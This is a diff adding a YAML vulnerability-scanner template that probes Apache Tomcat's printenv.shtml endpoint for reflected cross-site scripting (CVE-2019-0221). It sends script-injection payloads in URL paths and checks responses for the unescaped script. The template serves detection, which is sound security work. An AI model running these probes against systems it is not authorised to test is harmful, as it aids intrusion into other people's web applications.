@@ -1,0 +1,57 @@
+id: APACHE_TOMCAT_XSS
+info:
+  name: Apache Tomcat Cross-Site Scripting
+  description: "Apache Tomcat Cross-Site Scripting (XSS) vulnerabilities occur when Tomcat improperly sanitizes user input, allowing attackers to inject malicious scripts into web pages viewed by others. These scripts can execute in users' browsers, potentially stealing session cookies, sensitive data, or impersonating users. Proper input validation and output encoding are key to mitigating XSS risks in Tomcat applications."
+  details: "Apache Tomcat Cross-Site Scripting (XSS) vulnerabilities stem from flaws in how Tomcat processes and displays user-provided data. If input is not properly validated or sanitized, attackers can inject malicious scripts into web applications. These scripts execute in the browsers of unsuspecting users, leading to potential session hijacking, data theft, or unauthorized actions. Mitigating XSS involves strict input validation, output encoding, and regular updates to Tomcat."
+  impact: "The impact of Apache Tomcat Cross-Site Scripting (XSS) vulnerabilities can be severe, allowing attackers to execute arbitrary scripts in users' browsers. This can lead to session hijacking, where attackers gain unauthorized access to user accounts, theft of sensitive information like cookies or login credentials, and the impersonation of legitimate users. In some cases, XSS can even be used to spread malware or launch further attacks on a system."
+  category:
+    name: XSS
+    shortName: XSS
+    displayName: Cross-site scripting (XSS)
+  subCategory: APACHE_TOMCAT_XSS
+  severity: LOW
+  references:
+    - "https://owasp.org/www-community/attacks/xss/"
+    - "https://hackerone.com/reports/840759"
+  cwe:
+    - CWE-79
+  cve:
+    - CVE-2019-0221
+
+api_selection_filters:
+  method:
+    neq: "OPTIONS"
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    length:
+      gt: 0
+wordLists:
+  paths:
+    - "/printenv.shtml?<script>alert(12345678)</script>"
+    - "/ssi/printenv.shtml?<script>alert(12345678)</script>"
+execute:
+  type: single
+  requests:
+    - req:
+      - modify_method: GET
+      - modify_url: ${paths}
+      - replace_body: '{}'
+
+validate:
+  response_code:
+    eq: 200
+  response_payload:
+    length:
+      gt: 0
+    contains_all:
+      - "QUERY_STRING_UNESCAPED=<script>alert(12345678)</script>"
+  response_headers:
+    for_one:
+      key:
+        eq: "content-type"
+      value:
+        contains_either: "text/html"
+strategy:
+  run_once: /
